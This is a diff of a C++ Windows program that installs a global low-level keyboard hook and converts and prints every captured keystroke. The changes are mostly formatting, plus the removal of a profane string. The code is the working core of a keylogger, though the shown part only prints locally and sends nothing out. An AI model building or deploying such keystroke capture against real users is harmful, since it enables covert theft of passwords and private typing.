@@ -3,22 +3,19 @@
 #include <tchar.h>
 #include <WinUser.h>
 #include <iostream>
+#include <map>
 using namespace std;
 
 HHOOK _hook;
 KBDLLHOOKSTRUCT kbdStruct;
 
-typedef struct shrt {
-	char a[72] = "Whhasupp fuckers";
-};
-
-void UpdateK(BYTE *keystate, int keycode) 
+void UpdateK(BYTE* keystate, int keycode)
 {
 	keystate[keycode] = GetKeyState(keycode);
 }
 
 //The Keyboard procidure this is where the keyobard input is manipulated
-LRESULT CALLBACK KeyHookProc(int nCode,WPARAM wParam,LPARAM lParam)
+LRESULT CALLBACK KeyHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	//if the code is less than zero that means a key has not been pressed
 	if (nCode >= 0)
@@ -42,7 +39,7 @@ LRESULT CALLBACK KeyHookProc(int nCode,WPARAM wParam,LPARAM lParam)
 			HKL keyboard_layout = GetKeyboardLayout(0);
 
 			//Get the name
-			char lpsz_name[0x100] = {0};
+			char lpsz_name[0x100] = { 0 };
 
 			DWORD dwMsg = 1;
 			dwMsg += kbdStruct.scanCode << 16;
@@ -51,7 +48,7 @@ LRESULT CALLBACK KeyHookProc(int nCode,WPARAM wParam,LPARAM lParam)
 			int i = GetKeyNameText(dwMsg, (LPTSTR)lpsz_name, 255);
 
 			//Converting into Unicode
-			int result = ToUnicodeEx(kbdStruct.vkCode, kbdStruct.scanCode, keyboard_state, buffer,4,0, keyboard_layout);
+			int result = ToUnicodeEx(kbdStruct.vkCode, kbdStruct.scanCode, keyboard_state, buffer, 4, 0, keyboard_layout);
 			buffer[9] = L'\0';
 			//print the output
 
@@ -71,16 +68,16 @@ void InstHook()
 	{
 		printf("Failed to install hook!");
 	}
-	
+
 }
 
 int main()
 {
-	
+
 	InstHook();
 
 
 	MSG msg;
-	while (GetMessage(&msg, NULL, 0, 0)){}
+	while (GetMessage(&msg, NULL, 0, 0)) {}
 	return 0;
 }
